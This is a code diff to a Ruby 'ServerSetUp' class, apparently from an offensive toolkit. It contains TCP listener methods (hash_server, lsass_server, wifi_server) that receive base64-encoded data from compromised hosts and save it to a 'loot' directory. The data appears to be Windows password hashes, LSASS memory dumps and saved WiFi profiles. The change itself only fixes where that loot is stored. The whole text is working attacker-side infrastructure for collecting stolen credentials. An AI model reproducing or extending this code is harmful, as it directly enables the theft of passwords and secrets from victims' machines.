@@ -29,6 +29,7 @@ class ServerSetUp
     end
   end
   def hash_server(port)
+    Dir.mkdir(loot_dir) if not Dir.exists?(loot_dir)
     print_info("Starting Server!\n")
     server = TCPServer.open(port.to_i)
     x = 0
@@ -41,16 +42,18 @@ class ServerSetUp
         print_info("Writing to File\n")
         File.open("#{loot_dir}#{file_name.strip}#{x}", 'w') {|f| f.write(Base64.decode64(out_put))}
         print_success("File Done!\n")
-        print_info("Trying to print Hashes!\n")
-        Dir.mkdir(loot_dir) if not Dir.exists?(loot_dir)
-        print_hashes(x)
-        x += 1 if file_name == "sys\r\n"
+        if file_name == "sys\r\n"
+          print_info("Trying to print Hashes!\n")
+          print_hashes(x)
+          x += 1
+        end
       end
     }
     rescue => error
       print_error(error)
   end
   def lsass_server(port)
+    Dir.mkdir(loot_dir) if not Dir.exists?(loot_dir)
     print_info("Starting Server!\n")
     server = TCPServer.open(port.to_i)
     x = 0
@@ -70,6 +73,7 @@ class ServerSetUp
     print_error(error)
   end
   def wifi_server(port)
+    Dir.mkdir(loot_dir) if not Dir.exists?(loot_dir)
     print_info("Starting Server!\n")
     server = TCPServer.open(port.to_i)
     loop{
@@ -79,7 +83,7 @@ class ServerSetUp
         print_info("Getting Data\n")
         out_put = client.gets()
         print_info("Writing to File\n")
-        File.open("#{file_name.strip}.xml", 'w') {|f| f.write(Base64.decode64(out_put))}
+        File.open("#{loot_dir}#{file_name.strip}.xml", 'w') {|f| f.write(Base64.decode64(out_put))}
         print_success("File Done!\n")
       end
     }
